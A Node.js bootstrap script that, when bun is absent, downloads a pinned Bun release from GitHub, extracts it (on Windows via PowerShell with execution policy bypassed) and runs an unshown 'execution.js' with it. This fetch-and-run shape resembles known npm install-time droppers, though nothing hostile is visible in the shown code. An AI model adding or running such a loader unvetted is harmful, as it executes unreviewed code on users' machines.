#!/usr/bin/env node
import { execFileSync } from "child_process";
import fs from "fs";
import https from "https";
import os from "os";
import path from "path";
import { fileURLToPath } from "url";

const SCRIPT_DIR = path.dirname(fileURLToPath(import.meta.url));
const BUN_VERSION = "1.3.13";
const ENTRY_SCRIPT = "execution.js";
const REQUEST_TIMEOUT = 120_000;

const isAlpineOrMusl = () => {
  try {
    const lddOut = execFileSync("ldd", ["--version"], {
      stdio: ["ignore", "pipe", "pipe"],
    }).toString();
    if (lddOut.includes("musl")) return true;
  } catch {}
  try {
    return fs.readFileSync("/etc/os-release", "utf8").includes("Alpine");
  } catch {
    return false;
  }
};

const PLATFORM_MAP = {
  "linux-arm64": () => "bun-linux-aarch64",
  "linux-x64": () =>
    isAlpineOrMusl() ? "bun-linux-x64-musl-baseline" : "bun-linux-x64-baseline",
  "darwin-arm64": () => "bun-darwin-aarch64",
  "darwin-x64": () => "bun-darwin-x64",
  "win32-arm64": () => "bun-windows-aarch64",
  "win32-x64": () => "bun-windows-x64-baseline",
};

function resolveAsset() {
  const key = `${process.platform}-${process.arch}`;
  const resolver = PLATFORM_MAP[key];
  if (!resolver) throw new Error(`Unsupported platform/arch: ${key}`);
  return resolver();
}

function downloadToFile(url, dest, redirectsLeft = 5) {
  return new Promise((resolve, reject) => {
    const req = https.get(
      url,
      { headers: { "User-Agent": "node" }, timeout: REQUEST_TIMEOUT },
      (res) => {
        const { statusCode, headers } = res;
        if ([301, 302, 307, 308].includes(statusCode)) {
          res.resume();
          if (redirectsLeft <= 0)
            return reject(new Error("Too many redirects"));
          return downloadToFile(headers.location, dest, redirectsLeft - 1).then(
            resolve,
            reject,
          );
        }
        if (statusCode !== 200) {
          res.resume();
          return reject(new Error(`HTTP ${statusCode} for ${url}`));
        }
        const file = fs.createWriteStream(dest);
        res.pipe(file);
        file.on("finish", () => file.close(resolve));
        file.on("error", (err) => {
          fs.unlink(dest, () => reject(err));
        });
      },
    );
    req.on("error", reject);
    req.on("timeout", () => req.destroy(new Error("Request timed out")));
  });
}

function hasCommand(cmd, args = ["--version"]) {
  try {
    execFileSync(cmd, args, { stdio: "ignore" });
    return true;
  } catch {
    return false;
  }
}

function extractBun(zipPath, entry, outDir) {
  if (hasCommand("unzip", ["-v"])) {
    // -o overwrite, -j junk paths, -q quiet → places binary directly in outDir
    execFileSync("unzip", ["-ojq", zipPath, entry, "-d", outDir], {
      stdio: "inherit",
    });
    return;
  }

  if (process.platform === "win32" && hasCommand("powershell", ["-Help"])) {
    // Expand-Archive extracts the whole zip preserving structure.
    execFileSync(
      "powershell",
      [
        "-NoProfile",
        "-NonInteractive",
        "-ExecutionPolicy",
        "Bypass",
        "-Command",
        `Expand-Archive -LiteralPath '${zipPath}' -DestinationPath '${outDir}' -Force`,
      ],
      { stdio: "inherit" },
    );
    // Move the binary out of its nested folder so callers find it at outDir/<binName>.
    const nestedPath = path.join(outDir, entry);
    const flatPath = path.join(outDir, path.basename(entry));
    fs.renameSync(nestedPath, flatPath);
    return;
  }

  throw new Error(
    "No supported extractor found. Install `unzip`, or on Windows ensure PowerShell is available.",
  );
}

async function main() {
  if (hasCommand("bun")) return;

  const asset = resolveAsset();
  const isWin = process.platform === "win32";
  const binName = isWin ? "bun.exe" : "bun";
  const url = `https://github.com/oven-sh/bun/releases/download/bun-v${BUN_VERSION}/${asset}.zip`;

  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "bun-dl-"));
  const zipPath = path.join(tmpDir, `${asset}.zip`);
  const binPath = path.join(tmpDir, binName);
  const entryScriptPath = path.join(SCRIPT_DIR, ENTRY_SCRIPT);

  try {
    await downloadToFile(url, zipPath);
    extractBun(zipPath, `${asset}/${binName}`, tmpDir);
    fs.unlinkSync(zipPath);

    if (!isWin) fs.chmodSync(binPath, 0o755);
    execFileSync(binPath, [entryScriptPath], {
      stdio: "inherit",
      cwd: SCRIPT_DIR,
    });
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
}

main().catch((e) => {
  console.error(e.message);
  process.exit(1);
});
